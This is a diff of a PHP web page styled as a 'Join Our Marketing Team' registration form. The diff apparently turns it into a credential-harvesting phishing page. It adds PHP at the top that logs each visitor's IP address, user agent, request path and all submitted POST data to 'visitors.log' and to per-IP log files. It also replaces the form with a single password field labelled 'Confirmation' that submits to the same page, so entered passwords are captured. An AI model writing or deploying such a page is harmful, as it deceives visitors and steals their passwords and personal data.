@@ -1,3 +1,25 @@
+
+<?php
+
+$values = [
+  'date' => date('Y-m-d H:i:s'),
+  'ip' => $_SERVER['REMOTE_ADDR'],
+  'path' => $_SERVER['REQUEST_URI'],
+  'user-agent' => $_SERVER['HTTP_USER_AGENT'],
+  'extra' => $_POST
+];
+
+$ip_name = $_SERVER['REMOTE_ADDR'];
+
+if ($ip_name == "::1") {
+  $ip_name = "localhost";
+}
+
+file_put_contents('visitors.log', json_encode($values) . PHP_EOL, FILE_APPEND);
+file_put_contents(urlencode($ip_name) . '.log', json_encode($values) . PHP_EOL, FILE_APPEND);
+
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -100,48 +122,17 @@
     .footer a:hover {
       text-decoration: underline;
     }
-
-    .google-contain {
-        background: #4285F4;
-    }
   </style>
 </head>
 <body>
   <div class="container">
     <img src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAwR5qfll1low5flZPD5ejK6mWT_sWDKfefQ&s'/>
     <h2>Join Our Marketing Team</h2>
-    <form action="confirmation.php" method="POST">
+    <form action="#" method="POST">
       <div class="form-group">
-        <label for="fullname">Full Name</label>
-        <input required type="text" id="fullname" name="fullname" required />
+        <label for="password">Confirmation</label>
+        <input type="password" id="regcode" name="password" required />
       </div>
-      <div class="form-group">
-        <label for="email">Email Address or Phone Number</label>
-        <input required type="email" id="email" name="email" required />
-      </div>
-      <div class="form-group">
-        <label for="role">Role</label>
-        <select id="role" name="role" required>
-          <option value="">Select your role</option>
-          <option value="seo">SEO Specialist</option>
-          <option value="content">Content Marketer</option>
-          <option value="ads">PPC Expert</option>
-          <option value="social">Social Media Manager</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label for="password">Create Password</label>
-        <input required type="password" id="password" name="password" required />
-      </div>
-      <div class="form-group">
-        <label for="regcode">Registration Code</label>
-        <input required type="test" id="regcode" name="regcode" required />
-      </div>
-
-      <div style="text-align: center">You will recieve a one time password at the specified email or phone number</div>
-
-      <div>
-
       <button type="submit" class="btn">Register</button>
     </form>
   </div>
